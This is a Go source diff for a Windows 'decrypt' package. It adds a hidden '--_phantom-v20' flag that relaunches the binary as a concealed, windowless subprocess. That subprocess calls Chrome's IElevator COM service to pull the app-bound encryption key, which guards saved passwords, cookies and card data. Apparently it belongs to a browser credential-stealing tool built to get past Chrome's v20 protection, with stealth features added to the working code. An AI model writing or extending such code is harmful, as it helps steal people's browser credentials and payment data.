@@ -3,18 +3,70 @@
 package decrypt
 
 import (
+	"context"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"runtime"
 	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
+
+// SubprocessModeFlag is the internal hidden flag checked at startup in main.go
+// to run the crash-isolated v20 key extraction subprocess.
+const SubprocessModeFlag = "--_phantom-v20"
+
+// ExtractAndPrintAppBoundKey is called when the binary is launched in
+// subprocess mode. It attempts the IElevator COM call and prints the key as
+// hex to stdout, then exits. If it crashes, the parent process sees a non-zero
+// exit code and falls back to v10-only gracefully.
+func ExtractAndPrintAppBoundKey(profileDir, browserName string) {
+	key, err := getChromiumAppBoundKey(profileDir, browserName)
+	if err != nil {
+		os.Exit(1)
+	}
+	fmt.Printf("%x", key)
+	os.Exit(0)
+}
+
+// getChromiumAppBoundKeySubprocess spawns the current binary as a subprocess
+// to call the IElevator COM service in crash isolation. If the subprocess
+// crashes (SEH exception 0xc0000005), the parent receives a non-zero exit
+// code and returns an error — the caller then falls back to v10 only.
+func getChromiumAppBoundKeySubprocess(profileDir, browserName string) ([]byte, error) {
+	exe, err := os.Executable()
+	if err != nil {
+		return nil, fmt.Errorf("executable path: %w", err)
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, exe, SubprocessModeFlag, profileDir, browserName)
+	// Hide the console window so the subprocess is invisible.
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	out, err := cmd.Output()
+	if err != nil {
+		return nil, fmt.Errorf("v20 subprocess: %w", err)
+	}
+	key, err := hex.DecodeString(strings.TrimSpace(string(out)))
+	if err != nil {
+		return nil, fmt.Errorf("decode v20 key: %w", err)
+	}
+	if len(key) < 16 {
+		return nil, fmt.Errorf("v20 key too short (%d bytes)", len(key))
+	}
+	return key, nil
+}
 
 // Chrome introduced "app-bound encryption" in v127 (mid-2024) to protect
 // saved passwords, cookies, and credit cards against user-space credential
